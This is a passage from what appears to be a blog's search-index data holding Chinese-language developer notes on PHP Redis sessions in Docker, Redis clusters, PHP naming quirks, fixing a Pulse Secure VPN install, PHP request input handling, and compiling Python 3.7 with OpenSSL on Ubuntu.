redis\\nsession.save_path = tcp://redis/6379\"</span> &gt;&gt; /usr/<span class=\"built_in\">local</span>/etc/php/conf.d/docker-php-ext-redis.ini &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  apt-get remove unzip wget -y &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  apt-get clean &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/</span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\">RUN usermod -u 1000 www-data &amp;&amp; \\</span></span><br><span class=\"line\"><span class=\"bash\">  chown -R www-data:www-data /var/www/html/</span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\">WORKDIR /var/www/html</span></span><br><span class=\"line\"><span class=\"bash\">VOLUME /var/www/html</span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\">EXPOSE 9000</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://github.com/DawTaylor/php-redis-session/blob/master/php-7.1/Dockerfile\" target=\"_blank\" rel=\"noopener\">php-redis-session/Dockerfile at master · DawTaylor/php-redis-session</a></p>\n<p>這邊可能要注意<br>這個範例只有包 php-fpm(沒有 redis)<br><code>tcp://redis/6379</code>這一段 redis 需要照你的環境設定調整</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## redis 架設</span></span><br><span class=\"line\">docker run --name redis -d redis</span><br><span class=\"line\"><span class=\"comment\">## php-redis</span></span><br><span class=\"line\">docker run -d -p 80:80  --rm --name my-app -v  `<span class=\"built_in\">pwd</span>`:/var/www/html --link redis  dawtaylor/php-redis-session:5.6-apache</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://github.com/DawTaylor/php-redis-session\" target=\"_blank\" rel=\"noopener\">DawTaylor/php-redis-session</a></p>\n<p>文件有簡單說明，但沒有作 link</p>\n<p>測試使用方法可以寫一個 phpinfo 去看設定</p>\n<p>或者寫一個測試 php session</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">session_start();</span><br><span class=\"line\">$_SESSION[<span class=\"string\">'test'</span>] = <span class=\"number\">2</span>;</span><br><span class=\"line\">var_dump($_SESSION);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## redis cli 指令，可以進去container打redis-cli進入</span></span><br><span class=\"line\">keys *</span><br><span class=\"line\"><span class=\"comment\">## 查看某一個redis資料</span></span><br><span class=\"line\">get PHPREDIS_SESSION:b234200eb3afc2803630be437b177bd0</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://redis.io/commands/KEYS\" target=\"_blank\" rel=\"noopener\">KEYS – Redis</a></p>\n<h3 id=\"php-ini-設定\"><a href=\"#php-ini-設定\" class=\"headerlink\" title=\"php.ini 設定\"></a>php.ini 設定</h3><blockquote>\n<p>安裝 php-pecl-redis：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; yum install php-pecl-redis</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>修改 PHP 設定檔：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; session.save_handler = redis</span><br><span class=\"line\">&gt; session.save_path = &quot;tcp://127.0.0.1:6379?auth=密碼&quot;</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>其中 session.save_path 的格式為<br>session.save_path = “tcp://host1:6379?weight=1, tcp://host2:6379?weight=2&amp;timeout=2.5, tcp://host3:6379?weight=2&amp;read_timeout=2.5”<br>可設定的參數有：weight、timeout、persistent、prefix(預設”PHPREDIS_SESSION:”)、auth、database…</p>\n</blockquote>\n<p><a href=\"https://xyz.cinc.biz/2018/03/php-redis-session.html\" target=\"_blank\" rel=\"noopener\">XYZ 的筆記本: PHP 使用 Redis 儲存 Session</a></p>\n<h2 id=\"redis-cluster\"><a href=\"#redis-cluster\" class=\"headerlink\" title=\"redis cluster\"></a>redis cluster</h2><p>為什麼設定 redis cluster 要設定多個 IP?<br>這原本是我第一個疑問，但是網路上都沒有看到有人講這個<br>最後猜測是其實連其中一台，就可以做了<br>但是設定那台掛掉就連到 redis<br>不過我很好奇，怎麼不會用 haproxy 或 dns 去做設定??</p>\n<h3 id=\"redis-cluster-簡單介紹\"><a href=\"#redis-cluster-簡單介紹\" class=\"headerlink\" title=\"redis cluster 簡單介紹\"></a>redis cluster 簡單介紹</h3><p>(PS:這邊有參雜我自己的想法)</p>\n<p>因為目前沒有自己架設 redis cluster，所以我就不先研究那一快<br>畢竟我連 redis 架設可能不是很熟<br>但我覺得還是要了解他怎麼運作<br>一直設定 redis 連線設定，但我覺得還是要了解一下</p>\n<p>簡單我目前看到的認知 redis 有 master→slave (slave→slave)<br>這跟 mysql 一樣，有做備份的解決方案<br>在 redis 3.0 之前沒有 cluster 功能<br>所以會看到 sentinel 這個東西(目前我網路上看到的了解)<br>這個有點像是會監測 master 有沒有掛掉<br>假如掛掉的話，他會把 slave 調成 master<br>這樣你程式掛掉還是可以使用<br>cluster 也是有做這個事情<br>網路有看到 sentinel 沒辦法馬上做到 redis 掛掉那瞬間第一毫秒<br>所以有大量資料近來，有風險程式會沒接收到<br>假如沒寫好 try…catch 就會遺失資料</p>\n<p>簡單來說，redis cluster 正常來說會有六台<br>3 台 master3 台 slave，1 台 master 對應各 1 個 slave<br>3 個 master 做 cluster，當有一台 master 掛掉 slave 會變成 master<br>維持線上服務</p>\n<blockquote>\n<p>為什麼設定 redis cluster 要設定多個 IP?<br>這原本是我第一個疑問，但是網路上都沒有看到有人講這個<br>最後猜測是其實連其中一台，就可以做了<br>但是設定那台掛掉就連到 redis<br>不過我很好奇，怎麼不會用 haproxy 或 dns 去做設定??</p>\n</blockquote>\n<p>這邊我做一個假說，redis cluster 程式做多組 IP 是為了當第一台掛掉<br>可能連第二台 IP，所以這邊會放多組原因，就算連到的話。redis cluster 也會分配其中一台<br>那為什麼不做 haproxy，設定就不會那麼麻煩</p>\n<blockquote>\n<p>基于代理的分片<br>…<br>代理层多了一次转发，性能有所损耗。</p>\n</blockquote>\n<p><a href=\"https://juejin.im/post/5a54a6fbf265da3e3f4c9048\" target=\"_blank\" rel=\"noopener\">Redis Cluster 深入与实践（续） - 掘金</a> <a href=\"/blog/2019/04/13/PHP設定session為redis方法-Dockerfile/1.png\" title=\"備份圖\">備份圖</a></p>\n<p>看來設定多組有這個原因，所以才不用 haproxy，但不知道為什麼沒設定 DNS 呢?<br>DNS 導向也會影響?<br>這個問題我還沒想到</p>\n<h3 id=\"phpredis-predis\"><a href=\"#phpredis-predis\" class=\"headerlink\" title=\"phpredis,predis\"></a>phpredis,predis</h3><p>網路上有看到這兩個工具<br>簡來來說 phpredis 是透過 C 源生連線<br>predis 是透過 socket 去做連線<br>可能上方效能會比較好<br>predis 不需要安裝 redis 連線工具</p>\n<p><a href=\"https://www.zybuluo.com/phper/note/248555\" target=\"_blank\" rel=\"noopener\">在 php 中使用 redis cluster 集群 - 作业部落 Cmd Markdown 编辑阅读器</a></p>\n<blockquote>\n<p>predis，是 PHP 版本寫的 redis client，採用 socket 連接<br>php extension redis 是 PHP 原生擴展，C 寫的<br>由於沒有進行過大數據壓測，不能準確告訴你性能差異。但基本上擴展 redis 肯定比 predis 更好。<br>Laravel 推薦用 predis，主要是當心一些主機沒有支持 redis 吧。儘量少依賴 C 擴展，這樣才能發揮 PHP 普及眾生的思想。</p>\n</blockquote>\n<p><a href=\"https://segmentfault.com/q/1010000008848852\" target=\"_blank\" rel=\"noopener\">predis 包和 phpredis 扩展的区别是什么 - SegmentFault 思否</a></p>\n<h3 id=\"有關-docker-架設資源\"><a href=\"#有關-docker-架設資源\" class=\"headerlink\" title=\"有關 docker 架設資源\"></a>有關 docker 架設資源</h3><p><a href=\"https://github.com/Grokzen/docker-redis-cluster\" target=\"_blank\" rel=\"noopener\">Grokzen/docker-redis-cluster: Dockerfile for Redis Cluster (redis 3.0+)</a><br><a href=\"https://blog.yowko.com/redis-cluster-docker/\" target=\"_blank\" rel=\"noopener\">使用 docker 建立 Redis Cluster - 更新版 - Yowko’s Notes</a></p>\n<p>基於設定我就不多研究了<br>我看不懂裡面設定<br>先暫時留在這邊</p>\n<p>相關來源:</p>\n<ul>\n<li><a href=\"https://www.zybuluo.com/phper/note/248555\" target=\"_blank\" rel=\"noopener\">在 php 中使用 redis cluster 集群 - 作业部落 Cmd Markdown 编辑阅读器</a></li>\n<li><a href=\"https://segmentfault.com/q/1010000008848852\" target=\"_blank\" rel=\"noopener\">predis 包和 phpredis 擴展的區別是什麼 - SegmentFault 思否</a></li>\n<li><a href=\"https://www.cnblogs.com/zx-admin/p/7750612.html\" target=\"_blank\" rel=\"noopener\">phpredis Redis 集群 Redis Cluster - zh7314 - 博客园</a></li>\n<li><a href=\"https://juejin.im/post/5ad6e4066fb9a028d82c4b66\" target=\"_blank\" rel=\"noopener\">面试中关于 Redis 的问题看这篇就够了 - 掘金</a></li>\n<li><a href=\"https://juejin.im/post/5ad54d76f265da23970759d3\" target=\"_blank\" rel=\"noopener\">一文輕鬆搞懂 redis 集群原理及搭建與使用 - 掘金</a></li>\n<li><a href=\"https://github.com/DawTaylor/php-redis-session/tree/master/php-7.1\" target=\"_blank\" rel=\"noopener\">php-redis-session/php-7.1 at master · DawTaylor/php-redis-session</a></li>\n<li><a href=\"https://newsn.net/say/pecl-install-redis.html\" target=\"_blank\" rel=\"noopener\">php 如何通过 pecl 安装 redis 扩展</a></li>\n<li><a href=\"http://www.dczou.com/viemall/837.html\" target=\"_blank\" rel=\"noopener\">深入浅出 Docker 技术- Redis sentinel 集群的搭建 – VieMall</a></li>\n<li><a href=\"http://blueskykong.com/2017/09/29/rediscluster/\" target=\"_blank\" rel=\"noopener\">Redis Cluster 深入与实践 | Aoho’s Blog</a></li>\n<li><a href=\"https://juejin.im/post/5a54a6fbf265da3e3f4c9048\" target=\"_blank\" rel=\"noopener\">Redis Cluster 深入与实践（续） - 掘金</a></li>\n<li><a href=\"https://blog.yowko.com/redis-cluster-docker/\" target=\"_blank\" rel=\"noopener\">使用 docker 建立 Redis Cluster - 更新版 - Yowko’s Notes</a></li>\n<li><a href=\"https://xyz.cinc.biz/2018/03/php-redis-session.html\" target=\"_blank\" rel=\"noopener\">XYZ 的筆記本: PHP 使用 Redis 儲存 Session</a></li>\n</ul>\n<p><strong>2019-07-10</strong></p>\n<p>最近公司要用 redis cluster<br>所以 Google 一下設定</p>\n<ul>\n<li><a href=\"https://github.com/phpredis/phpredis/blob/develop/cluster.markdown#session-handler\" target=\"_blank\" rel=\"noopener\">phpredis/cluster.markdown at develop · phpredis/phpredis</a></li>\n<li><a href=\"https://xyz.cinc.biz/2018/03/php-redis-session.html\" target=\"_blank\" rel=\"noopener\">XYZ 的筆記本: PHP 使用 Redis 儲存 Session</a></li>\n</ul>\n<p>這個設定要安裝 pecl-php-redis</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">session.save_handler = rediscluster</span><br><span class=\"line\">session.save_path = &quot;seed[]=host1:port1&amp;seed[]=host2:port2&amp;seed[]=hostN:portN&amp;timeout=2&amp;read_timeout=2&amp;failover=error&amp;persistent=1&amp;auth=password&quot;</span><br></pre></td></tr></table></figure>\n<p>設定沒有想像中麻煩</p>\n<p>save_path 可用 array_map 和 join 去組出字串</p>\n","categories":["PHP"],"tags":["php","redis","session"]},{"title":"PHP變數宣告大小寫與vscode PHP intellisense for codeigniter","url":"/blog/2018/10/23/PHP%E8%AE%8A%E6%95%B8%E5%AE%A3%E5%91%8A%E5%A4%A7%E5%B0%8F%E5%AF%AB%E8%88%87vscode-PHP-intellisense-for-codeigniter/","content":"<p>今天發現PHP變數大小事情<br>還是小記，怕以後忘記<br><a id=\"more\"></a></p>\n<p> class, function 命名呼叫可以大小寫沒有分<br> 變數,和class屬性命名大小寫有分</p>\n<p> 後來簡單測試一下，感覺PHP <code>變數</code>跟<code>函式</code>可以撞名<br> <code>變數</code>分大小寫<br> <code>函式</code>不分大小寫<br>這樣就通了</p>\n<p>還簡單做了小實驗<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">a</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $b = <span class=\"string\">'test'</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">b</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'test2'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = <span class=\"keyword\">new</span> A;</span><br><span class=\"line\">$a-&gt;B();</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">a</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $b = <span class=\"string\">'test'</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">a</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'test2'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = <span class=\"keyword\">new</span> A;</span><br><span class=\"line\">$a-&gt;A();</span><br></pre></td></tr></table></figure>\n<p>跑出兩個<code>test2test2</code><br><del>不小心測出意料結果，別緊張</del><br>這是因為<code>建構式</code></p>\n<p>PHP7.0開始會有提示<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;br /&gt;</span><br><span class=\"line\">&lt;b&gt;Deprecated&lt;/b&gt;:  Methods with the same name as their class will not be constructors in a future version of PHP; a has a deprecated constructor in &lt;b&gt;[...][...]&lt;/b&gt; on line &lt;b&gt;4&lt;/b&gt;&lt;br /&gt;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://blog.twbryce.com/php-writing-habit-detailed-concepts/\" target=\"_blank\" rel=\"noopener\">PHP的細節觀念與撰寫習慣 – Bryce’S Note</a></p>\n<h2 id=\"vscode-PHP-intellisense-for-codeigniter\"><a href=\"#vscode-PHP-intellisense-for-codeigniter\" class=\"headerlink\" title=\"vscode PHP intellisense for codeigniter\"></a>vscode PHP intellisense for codeigniter</h2><p><a href=\"https://marketplace.visualstudio.com/items?itemName=small.php-ci\" target=\"_blank\" rel=\"noopener\">PHP intellisense for codeigniter - Visual Studio Marketplace</a></p>\n<p>安裝這個可以方便在vscode寫CI<br>不過…由於我公司開發規範第一個檔名都要大寫…<br>所以呼叫mod那邊好像怪怪的<br>但方便PHP intellisense都是好套件XD</p>\n<p>但注意需要放置<code>system</code><br>由於我們公司專案沒有在底層放system<br>所以需要自己copy一份<code>system</code>到目錄<br>或去vscode設定那邊調整位置</p>\n","categories":["PHP"],"tags":["php","vscode"]},{"title":"Pulse Secure 不能使用，重新安裝方法","url":"/blog/2019/10/24/Pulse-Secure-%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8%EF%BC%8C%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%9D%E6%96%B9%E6%B3%95/","content":"<p>最近用 VPN 連到公司網域<br>但不明原因遠端只要關掉就打不開<br>只有在重新開機開起 Pulse Secure 可以使用<br>重開應用程式就不能了<br>然後過了好幾天，我登入更新完後，就不能用了<br>移除也移除不了…<br>網路上看也沒有人解決 orz</p>\n<p>只好自己來!!!</p>\n<a id=\"more\"></a>\n<ol>\n<li>移除應用程式，如果順利就重新安裝</li>\n</ol>\n<p>不能安裝就繼續往下做，我是遇到 他說 <strong>PulseSecureService</strong> 不能stopped<br>我又看了一下服務，不能做設定。所以要想辦法移除<br>但偏偏不能移除orz</p>\n<ol start=\"2\">\n<li><p>sc.exe delete PulseSecureService，執行完需要重開機(PS: 我用powershell)</p>\n</li>\n<li><p>安裝<a href=\"https://ccnet.ntu.edu.tw/vpn/for-windows.html\" target=\"_blank\" rel=\"noopener\">NTU SSL VPN</a>VPN程式</p>\n</li>\n</ol>\n<p>不知道為什麼我用的VPN網頁裝下來不能用<br>但是安裝這個就能順利執行</p>\n<p>希望看到的大家有解決問題!!</p>\n","categories":["Windows"],"tags":["vpn","pulse","secure"]},{"title":"$_POST和php://input小記","url":"/blog/2019/04/08/POST%E5%92%8Cphp-input%E5%B0%8F%E8%A8%98/","content":"<p>最近有一支 API 踩到一個 API<br>他 request header 帶<code>Content-Type: json</code><br>但我們平常寫程式可能不會注意到的地方<br>這邊我小記一下</p>\n<a id=\"more\"></a>\n<h2 id=\"POST\"><a href=\"#POST\" class=\"headerlink\" title=\"\\$_POST\"></a>\\$_POST</h2><p><strong>只有 application/x-www-form-urlencoded or multipart/form-data 是有效的!!</strong><br><strong>只有 application/x-www-form-urlencoded or multipart/form-data 是有效的!!</strong><br><strong>只有 application/x-www-form-urlencoded or multipart/form-data 是有效的!!</strong></p>\n<p>所以當<code>Content-Type:application/json</code><br>\\$_POST 變數不會有任何作用!!!</p>\n<blockquote>\n<p>An associative array of variables passed to the current script via the HTTP POST method when using application/x-www-form-urlencoded or multipart/form-data as the HTTP Content-Type in the request.<br>$HTTP_POST_VARS contains the same initial information, but is not a superglobal. (Note that $HTTP_POST_VARS and \\$_POST are different variables and that PHP handles them as such)</p>\n</blockquote>\n<blockquote>\n<p>當 HTTP POST 請求的 Content-Type 是 application/x-www-form-urlencoded 或 multipart/form-data 時，會將變量以關聯數組形式傳入當前腳本。<br>$HTTP_POST_VARS 包含相同的信息，但它不是一個超全局變量。 (注意 $HTTP_POST_VARS 和 \\$_POST 是不同的變量，PHP 處理它們的方式不同)</p>\n</blockquote>\n<p>EX:</p>\n<h2 id=\"php-input\"><a href=\"#php-input\" class=\"headerlink\" title=\"php://input\"></a>php://input</h2><p><strong>Content-Type:multipart/form-data 是無效的!!</strong><br><strong>Content-Type:multipart/form-data 是無效的!!</strong><br><strong>Content-Type:multipart/form-data 是無效的!!</strong></p>\n<blockquote>\n<p>php://input 是個可以訪問請求的原始數據的只讀流。 POST 請求的情況下，最好使用 php://input 來代替 $HTTP_RAW_POST_DATA，因為它不依賴於特定的 php.ini 指令。 而且，這樣的情況下 $HTTP_RAW_POST_DATA 默認沒有填充， 比激活 always_populate_raw_post_data 潛在需要更少的內存。 enctype=”multipart/form-data” 的時候 php://input 是無效的。</p>\n</blockquote>\n<p>仔細想想，可以開發者工具來看，通常用<strong>multipart/form-data</strong>都是用來上傳檔案的，所以會看到一些串流內容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">之前看過Xuite API，[Xuite 開發者首頁](http://api.xuite.net/document/xuite_dev/public/front/index/id/267)</span><br><span class=\"line\">他們上傳檔案API是要打兩次</span><br><span class=\"line\">第一次取upload資訊，會取得第二次上傳打API網址</span><br></pre></td></tr></table></figure>\n<p>事後覺得我想太多，他們 Content-Type 不是傳 JSON</p>\n<p><a href=\"https://www.php.net/manual/zh/wrappers.php\" target=\"_blank\" rel=\"noopener\">PHP: 支持的协议和封装协议 - Manual</a></p>\n<p><a href=\"https://xyz.cinc.biz/2013/06/php-filegetcontents-post.html\" target=\"_blank\" rel=\"noopener\">XYZ 的筆記本: PHP 使用 file_get_contents 接收 POST 的資料</a> <a href=\"/blog/2019/04/08/POST和php-input小記/1.png\" title=\"備份圖\">備份圖</a><br><a href=\"http://www.nowamagic.net/academy/detail/12220520\" target=\"_blank\" rel=\"noopener\">深入剖析 PHP 输入流 php://input – 简明现代魔法</a> <a href=\"/blog/2019/04/08/POST和php-input小記/2.png\" title=\"備份圖\">備份圖</a></p>\n<h2 id=\"HTTP-RAW-POST-DATA\"><a href=\"#HTTP-RAW-POST-DATA\" class=\"headerlink\" title=\"\\$HTTP_RAW_POST_DATA\"></a>\\$HTTP_RAW_POST_DATA</h2><p>PHP7.0 已移除，建議不要使用。</p>\n<p><strong>This feature was DEPRECATED in PHP 5.6.0, and REMOVED as of PHP 7.0.0.</strong></p>\n<blockquote>\n<p>$HTTP_RAW_POST_DATA contains the raw POST data. See always_populate_raw_post_data.<br>In general, php://input should be used instead of $HTTP_RAW_POST_DATA.</p>\n</blockquote>\n","categories":["PHP"],"tags":["php"]},{"title":"在 Ubutnu 安裝 Python 3.7 筆記","url":"/blog/2019/11/07/Python-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/","content":"<p>最近在 Linux 安裝 Python 3.7 發現原生 <code>apt</code> 沒有包<br>需要手動編譯安裝<br>但遇到很多問題<br>在這邊小記</p>\n<a id=\"more\"></a>\n<p>各種 Linux 遇到安裝會不太一樣<br>網路的教學也不是都很能順利安裝<br>由其是 ctype 還是不知道什麼原因會有問題<br>但網路找的步驟用一用<br>還不是很確定哪一個項目解除<br>以下各種方法可以試試</p>\n<h2 id=\"安裝-Python3-7\"><a href=\"#安裝-Python3-7\" class=\"headerlink\" title=\"安裝 Python3.7\"></a>安裝 Python3.7</h2><p>首先，先檢查 openssl version<br>不然跑 pip 時會出現</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Install requirements</span><br><span class=\"line\">sudo apt-get install -y build-essential</span><br><span class=\"line\">sudo apt-get install -y checkinstall</span><br><span class=\"line\">sudo apt-get install -y libreadline-gplv2-dev</span><br><span class=\"line\">sudo apt-get install -y libncursesw5-dev</span><br><span class=\"line\">sudo apt-get install -y libssl-dev</span><br><span class=\"line\">sudo apt-get install -y libsqlite3-dev</span><br><span class=\"line\">sudo apt-get install -y tk-dev</span><br><span class=\"line\">sudo apt-get install -y libgdbm-dev</span><br><span class=\"line\">sudo apt-get install -y libc6-dev</span><br><span class=\"line\">sudo apt-get install -y libbz2-dev</span><br><span class=\"line\">sudo apt-get install -y zlib1g-dev</span><br><span class=\"line\">sudo apt-get install -y openssl</span><br><span class=\"line\">sudo apt-get install -y libffi-dev</span><br><span class=\"line\">sudo apt-get install -y python3-dev</span><br><span class=\"line\">sudo apt-get install -y python3-setuptools</span><br><span class=\"line\">sudo apt-get install -y wget</span><br><span class=\"line\">sudo apt-get install zlib1g-dev # </span><br><span class=\"line\">sudo apt-get install libffi-dev # ctype 問題 參考如下</span><br><span class=\"line\"># Prepare to build</span><br><span class=\"line\">mkdir /tmp/Python37</span><br><span class=\"line\">cd /tmp/Python37</span><br><span class=\"line\"># Pull down Python 3.7, build, and install</span><br><span class=\"line\">wget https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tar.xz</span><br><span class=\"line\">tar xvf Python-3.7.0.tar.xz</span><br><span class=\"line\">cd /tmp/Python37/Python-3.7.0</span><br><span class=\"line\">./configure --enable-optimizations</span><br><span class=\"line\">sudo make altinstall</span><br><span class=\"line\"></span><br><span class=\"line\"># openssl 安裝(看情行使用，越新的Linux 應該不會做到這個)</span><br><span class=\"line\">sudo apt-get install -y wget</span><br><span class=\"line\">mkdir /tmp/openssl</span><br><span class=\"line\">cd /tmp/openssl</span><br><span class=\"line\">wget https://www.openssl.org/source/openssl-1.0.2q.tar.gz</span><br><span class=\"line\">tar xvf openssl-1.0.2q.tar.gz</span><br><span class=\"line\">cd /tmp/openssl/openssl-1.0.2q</span><br><span class=\"line\">./config</span><br><span class=\"line\">make</span><br><span class=\"line\">sudo make install</span><br><span class=\"line\">sudo ln -sf /usr/local/ssl/bin/openssl `which openssl` </span><br><span class=\"line\"></span><br><span class=\"line\">## 這邊可以登出再登入 openssl version 有沒有換掉</span><br><span class=\"line\"></span><br><span class=\"line\">sudo pip3.7 install --upgrade pip</span><br></pre></td></tr></table></figure>\n<h3 id=\"pip-tls-問題\"><a href=\"#pip-tls-問題\" class=\"headerlink\" title=\"pip tls 問題\"></a>pip tls 問題</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.</span><br><span class=\"line\">Collecting virtualenv</span><br><span class=\"line\">  Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None)) after connection broken by &apos;SSLError(&quot;Can&apos;t connect to HTTPS URL because the SSL module is not available.&quot;)&apos;: /simple/virtualenv/</span><br><span class=\"line\">  Retrying (Retry(total=3, connect=None, read=None, redirect=None, status=None)) after connection broken by &apos;SSLError(&quot;Can&apos;t connect to HTTPS URL because the SSL module is not available.&quot;)&apos;: /simple/virtualenv/</span><br><span class=\"line\">  Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by &apos;SSLError(&quot;Can&apos;t connect to HTTPS URL because the SSL module is not available.&quot;)&apos;: /simple/virtualenv/</span><br><span class=\"line\">  Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by &apos;SSLError(&quot;Can&apos;t connect to HTTPS URL because the SSL module is not available.&quot;)&apos;: /simple/virtualenv/</span><br><span class=\"line\">  Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by &apos;SSLError(&quot;Can&apos;t connect to HTTPS URL because the SSL module is not available.&quot;)&apos;: /simple/virtualenv/</span><br><span class=\"line\">  Could not fetch URL https://pypi.org/simple/virtualenv/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host=&apos;pypi.org&apos;, port=443): Max retries exceeded with url: /simple/virtualenv/ (Caused by SSLError(&quot;Can&apos;t connect to HTTPS URL because the SSL module is not available.&quot;)) - skipping</span><br><span class=\"line\">  Could not find a version that satisfies the requirement virtualenv (from versions: )</span><br><span class=\"line\">No matching distribution found for virtualenv</span><br><span class=\"line\">pip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.</span><br><span class=\"line\">Could not fetch URL https://pypi.org/simple/pip/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host=&apos;pypi.org&apos;, port=443): Max retries exceeded with url: /simple/pip/ (Caused by SSLError(&quot;Can&apos;t connect to HTTPS URL because the SSL module is not available.&quot;)) - skipping</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.51cto.com/13544424/2149473\" target=\"_blank\" rel=\"noopener\">python3.7安装后ssl问题-苏黎世1995的博客-51CTO博客</a></p>\n<p>PS:後來發現是我的 ubuntu 版本太舊</p>\n<p>選越大越不會遇到這個問題 ubuntu/xenial64<br>我一開始用 hashicorp/precise64  畢竟名次很前面<br><a href=\"https://app.vagrantup.com/hashicorp\" target=\"_blank\" rel=\"noopener\">hashicorp - Vagrant Cloud</a></p>\n<h3 id=\"openssl\"><a href=\"#openssl\" class=\"headerlink\" title=\"openssl\"></a>openssl</h3><p>上面已經有放，不過我放一下我網路找到的文章<br>但不太想整理，這邊可能有點亂</p>\n<p><a href=\"https://help.dreamhost.com/hc/en-us/articles/360001435926-Installing-OpenSSL-locally-under-your-username\" target=\"_blank\" rel=\"noopener\">Installing OpenSSL locally under your username – DreamHost</a></p>\n<p>卡在 <a href=\"https://blog.csdn.net/github_38336924/article/details/82692075\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/github_38336924/article/details/82692075</a><br>./python: error while loading shared libraries: libssl.so.1.1: cannot open shared object file: Error 40<br>generate-posix-vars failed<br>make: *** [pybuilddir.txt] Error 1<br>＿<br><del>未解</del><br>請參考python3.7安裝步驟</p>\n<p><a href=\"https://joshspicer.com/python37-ssl-issue\" target=\"_blank\" rel=\"noopener\">SSL issues with Python 3.7 Install From Source</a><br>後來嘗試這篇</p>\n<p><a href=\"https://askubuntu.com/questions/1000629/how-to-install-openssl-1-0-2-with-default-openssl-1-1-1-on-ubuntu-16-04\" target=\"_blank\" rel=\"noopener\">How to install openssl 1.0.2 with default openssl (1.1.1) on Ubuntu 16.04? - Ask Ubuntu</a><br># (This will create a sym link to the new binaries)<br>sudo ln -sf /usr/local/ssl/bin/openssl <code>which openssl</code> </p>\n<h3 id=\"ModuleNotFoundError-No-module-named-‘-ctypes’\"><a href=\"#ModuleNotFoundError-No-module-named-‘-ctypes’\" class=\"headerlink\" title=\"ModuleNotFoundError: No module named ‘_ctypes’\"></a>ModuleNotFoundError: No module named ‘_ctypes’</h3><p>未解之謎，但用一用就正常</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ModuleNotFoundError: No module named ‘_ctypes’</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get upgrade</span><br><span class=\"line\">sudo apt-get dist-upgrade</span><br><span class=\"line\">sudo apt-get install build-essential python-dev python-setuptools python-pip python-smbus</span><br><span class=\"line\">sudo apt-get install build-essential libncursesw5-dev libgdbm-dev libc6-dev</span><br><span class=\"line\">sudo apt-get install zlib1g-dev libsqlite3-dev tk-dev</span><br><span class=\"line\">sudo apt-get install libssl-dev openssl</span><br><span class=\"line\">sudo apt-get install libffi-dev</span><br><span class=\"line\"></span><br><span class=\"line\">[安装python3.7时候，报错ModuleNotFoundError: No module named &apos;_ctypes&apos; - wang725的专栏 - CSDN博客](https://blog.csdn.net/wang725/article/details/79905612)</span><br><span class=\"line\">or</span><br><span class=\"line\">[python - Python3: ImportError: No module named &apos;_ctypes&apos; when using Value from module 